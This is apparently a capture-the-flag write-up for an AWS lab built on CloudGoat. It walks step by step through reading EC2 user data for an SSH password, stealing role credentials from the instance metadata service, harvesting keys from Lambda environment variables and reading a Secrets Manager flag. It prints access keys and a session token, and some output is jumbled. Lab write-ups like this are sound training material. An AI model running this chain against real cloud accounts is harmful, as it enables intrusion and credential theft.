---
layout: default
title: "Data Secrets"
---

# ./ Hacksmarter/Data_Secrets:~# 

\>> **Machine:** Data Secrets

\>> **Platform:** AWS

\>> **Difficulty:** Medium

---

### [~] Initial_Access:~#

We start with a set of low-privilege IAM credentials. First, we configure our local profile and verify the identity of the `cg-start-user`:

```bash
> aws configure --profile data

AWS Access Key ID [None]: AKIA2HVQ5NJFVWNNM4P2
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]:

> aws sts get-caller-identity --profile data

{
 "UserId": "AIDA2HVQ5NJFWDWR7PN3H",
 "Account": "703671921227",
 "Arn": "arn:aws:iam::703671921227:user/cg-start-user-cgid
ogtj5df20x"
}
```

### [!] EC2_Enumeration:~#
Scanning for active compute resources. We find two instances tagged as cg-sensitive-ec2.

```bash
> aws ec2 describe-instances --profile data --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,Tags]'
```
One instance (i-0405a86bd1eb8a6f9) has a public IP: 98.91.201.20.
```bash
 "SubnetId": "subnet-09605a2de4d0192c8",
 "VpcId": "vpc-023d90ba9cd755f55",
 "PrivateIpAddress": "10.0.1.234",
 "PublicIpAddress": "98.91.201.20"
 }
```

To find a way in, I checked the UserData attribute of the instances. Developers often leave setup scripts here that contain hardcoded credentials:

```bash
> aws ec2 describe-instance-attribute --instance-id i-0ab04892607e68a09 --attribute userData --profile data

{
 "InstanceId": "i-0ab04892607e68a09",
 "UserData": {
 "Value": "IyEvYmluL2Jhc2gKZWNobyAiZWMyLXVzZXI6Q2xvdWR
Hb2F0SW5zdGFuY2VQYXNzd29yZCEiIHwgY2hwYXNzd2QKc2VkIC1pICdzL1Bh
c3N3b3JkQXV0aGVudGljYXRpb24gbm8vUGFzc3dvcmRBdXRoZW50aWNhdGlvb
iB5ZXMvZycgL2V0Yy9zc2gvc3NoZF9jb25maWcKc2VydmljZSBzc2hkIHJlc3
RhcnQK"
 }
}

```

Decodeding from base64 gives us user creds for ssh:

```bash
#!/bin/bash
echo "ec2-user:CloudGoatInstancePassword!" | chpasswd
```

### [#] Lateral_Movement:~#
Using the leaked password, I SSH'd into the public instance.
Once inside, I queried the Instance Metadata Service (IMDS) to steal the IAM role credentials attached to the VM:

```bash 
> curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid42ghgr66ot

{
 "Code" : "Success",
 "LastUpdated" : "2026-03-21T00:39:41Z",
 "Type" : "AWS-HMAC",
 "AccessKeyId" : "ASIA2HVQ5NJFQ7HHCPSH",
 "SecretAccessKey" : "P1VGUS77qkIHQB90tI+ua+iQbgZL26DbHtC
7V/Qx",
 "Token" : "IQoJb3JpZ2luX2VjEHkaCXVzLWVhc3QtMSJIMEYCIQCuW
X6yiN/fOaFvhzBrd8hW9qHkV+DjKPf2L01FijlCsAIhAIe5DF/rhIn5xqu
LahkWQwZXQ1S1rbZGxBb6YCuUdCUuKrkFCEIQABoMNzAzNjcxOTIxMjI3I
gw4BO/Ljbtl+F1EUXQqlgV2udGcVljaV81okWrBDb5ClwuA8FdTBectAl
A/zNvzzTIKdqgLi97xOwQJxB+s6id19yAKszWKobxB9EtIzoYjzPglHSg2
7E0ASgv4nZen563wyWeGJNCDlxyrwk6ayP0cDhps3xxIBokub1mjHCUNcn
3dmI6S+lIwnqFe5nsQqxdWAFQlVuu1Xw96G3BQ/hc7bKNutbi8hFi4V9LI
IYgHIodxzis5OtgIjTg1c/XdHR0ZHnpYd/Xqza/cydqVQgIBTZyLYnp/bv
rJuOMoa7ZNrnTgVK0C/Yslf7wxU32noxgznvZ01BJidS90O0f0UqKlgaAR
F1zNOsV7W6SqPWIeXwiTPxmFK8uXLt2F3lxSNKq8rjtw0v5kipL4JdDh2S
f1qG8M0KyLeOGkvAnlWypwGU1CoSKUNo2SEehSniZVb5y1Fvg2wYSxdcKW
HIgKWSxewAGPBl5t+dTObtqAFm7HYWqmW/zgT6HICiGN6BBvsP6mmU0+Xg
AZ0/ghx32C6WyQ0m7xI4UYo+m9uYnNp95st6OIO73OCMn8+pzm50W7O5ur
kUjJxykUg8KrfIE+ohEN7ORnrCpZpc9hnZHL7mz09fEId19Jr2hL2+Mug5
7ljksjAvtOTwOh5O4j7YDuc5f7cMLfLkwYF9lSjm6SIjWJhivlhl3IgG5D
WzvHQK4TPkamCWnsNnMkHVwACQnL4Mh2YRWwdDEgTezkXJe3s/xIZt8BEo
EC+Lr2OZ6Jrv06/EUHZ9M0nACN+KaN6HpLid2XG0WPJISZMDkP8sZnlmO4
zgYvfT2fNe8LUsw5R3pbST+I7UD+eZM7MwrLDwYpEG8u0BWkv3cnOszGc2
IlOH30qJ183qnbtVLz800AHUAbBHs+ezy23DCg0ffNBjqwAXf6fmaPri1Z
DBWqL1iVWVgQe7vRgUxnN9/Ib+/Lx9HCJU8rs032XXVXr1F2pNdLMouHsx
f+kPfib78h0riFnmAGTsvaiIYTuL1PbTNIMnkb348MzYIs8RVnGq7E4utE
k5N7DtEe/ZZYKCELUqKCq7ViaDhJ0xNQfc30KzS/9dEYOSQEjgVaCflGvQ
Ngh5uFQE4AmJESlTwxH0wYpRVjvvsuW3es3xbKPduYrP6jDVOD",
 "Expiration" : "2026-03-21T07:13:56Z"
```
I exported these creds to my local machine as a new profile named role.
```bash
> aws sts get-caller-identity --profile role

{
 "UserId": "AROA2HVQ5NJFSNSMSBSWI:i-0499bcfeb96d4af40",
 "Account": "703671921227",
 "Arn": "arn:aws:sts::703671921227:assumed-role/cg-ec2-rol
e-cgid42ghgr66ot/i-0499bcfeb96d4af40"
}
```

### [!] Lambda_Credential_Harvesting:~#
With the EC2 role permissions, I enumerated the Lambda functions in the account:

```bash
> aws lambda list-functions --profile role --region us-east-1
```
The function is configured with plaintext AWS credentials in its Environment Variables.

```json
"Environment": {
    "Variables": {
        "DB_USER_ACCESS_KEY": "AKIA2HVQ5NJFZNHXUN6W",
        "DB_USER_SECRET_KEY": "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"
    }
}
```

### [#] Secrets_Manager:~#
Using the new user credentials I got, I configured another user's aws profile:

```bash
> aws configure --profile user

AWS Access Key ID [None]: AKIA2HVQ5NJFZNHXUN6W
AWS Secret Access Key [None]: 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
Default region name [None]:
Default output format [None]:

> aws sts get-caller-identity --profile user --region us-east-1

{
 "UserId": "AIDA2HVQ5NJFXFOHWJWQW",
 "Account": "703671921227",
 "Arn": "arn:aws:iam::703671921227:user/cg-lambda-userData Secrets 22
cgid1cu9rl0f6y"
}
```
This user had the permissions required to access the  AWS Secrets Manager.

```bash
> aws secretsmanager list-secrets --profile user --region us-east-1

"ARN": "arn:aws:secretsmanager:us-east-1:70367192
1227:secret:cg-final-flag-cgid42ghgr66ot-7sidLT",
 "Name": "cg-final-flag-cgid42ghgr66ot",
Data Secrets 24
 "Description": "The final flag for the CloudGoat
scenario",
 "LastChangedDate": "2026-03-21T01:38:41.531000+0
1:00",
 "LastAccessedDate": "2026-03-21T01:00:00+01:00",
 "Tags": [
 {
 "Key": "Scenario",
 "Value": "scenario_template"
 },
 {
 "Key": "Stack",
 "Value": "CloudGoat"
 },
 {
 "Key": "Name",
 "Value": "cg-final-flag-cgid42ghgr66ot"
 }
 ],
 "SecretVersionsToStages": {
 "terraform-20260321003841455400000002": [
 "AWSCURRENT"
 ]
 },
 "CreatedDate": "2026-03-21T01:38:41.329000+01:00"
 }
 ]
}
```
From here, I could get the flag with the secret-id
```bash
> aws secretsmanager get-secret-value --secret-id cg-final-flag-cgid1cu9rl0f6y --profile user

{
 "ARN": "arn:aws:secretsmanager:us-east-1:703671921227:sec
ret:cg-final-flag-cgid1cu9rl0f6y-Qe2Tlq",
 "Name": "cg-final-flag-cgid1cu9rl0f6y",
 "VersionId": "terraform-20260320184038801300000002",
 "SecretString": "{\"flag\":\"d4t4_s3cr3ts_4r3_fun\"}",
 "VersionStages": [
 "AWSCURRENT"
 ],
 "CreatedDate": "2026-03-20T19:40:38.836000+01:00"
```

Final_Flag: d4t4_s3cr3ts_4r3_fun

Thank you .
